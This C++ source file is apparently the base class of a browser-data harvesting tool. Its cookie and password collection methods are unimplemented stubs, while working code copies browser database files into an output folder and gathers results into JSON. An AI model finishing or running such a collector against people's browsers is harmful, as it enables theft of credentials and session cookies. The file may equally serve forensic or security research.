#include "Browser.h"

void Tool::Browsers::Browser::GetUserCookies(awesomejson::json& jUserCookies) {
	throw "Not implemented";
}

void Tool::Browsers::Browser::ExecuteAllModules(awesomejson::json& jFinalResults, Tool::Browsers::Browser& Browser) {
	throw "Not implemented";
}


void Tool::Browsers::Browser::GetUserPasswords(awesomejson::json& jUserPasswords) {
	throw "Not implemented";
}

void Tool::Browsers::Browser::CreateBrowserProductDir() {
	std::filesystem::create_directories(std::format("{}\\{}", MainContext_t.sMainDirectory, this->sBrowserIdentifier));
}

Tool::Browsers::Browser::Browser(Tool::Configuration::config_t MainContext_t){
	this->MainContext_t = MainContext_t;
}

void Tool::Browsers::Browser::CopyBrowserFileToProducts(std::string sSourceFilePath, std::string& sCopiedFilePath) {
	std::wstring wDbFilePath(sSourceFilePath.begin(), sSourceFilePath.end());
	sCopiedFilePath = std::format(STR("{}\\{}\\{}"),
		this->MainContext_t.sMainDirectory,
		this->sBrowserIdentifier,
		std::filesystem::path(wDbFilePath.c_str()).filename().string());

	if (!CopyFileW(wDbFilePath.c_str(), std::wstring(sCopiedFilePath.begin(), sCopiedFilePath.end()).c_str(), FALSE)) {
		Tool::Utils::print_error(std::format(STR("Error copying file {} to destination"), sSourceFilePath));
		sCopiedFilePath = "";
	}
}

void Tool::Browsers::Browser::Execute(Tool::Browsers::Browser& bBrowser, Tool::Configuration::config_t& MainContext_t, awesomejson::json& jFinalBuffer){
	awesomejson::json jBrowserResults = awesomejson::json();
	std::string tempKey(bBrowser.sBrowserIdentifier);
	if (bBrowser.bIsBrowserInstalled) {
		bBrowser.ExecuteAllModules(jBrowserResults, bBrowser);
		jFinalBuffer[tempKey] = jBrowserResults;
		Tool::Utils::print(std::format(STR("Finished {}"), bBrowser.sBrowserIdentifier));
	}
}
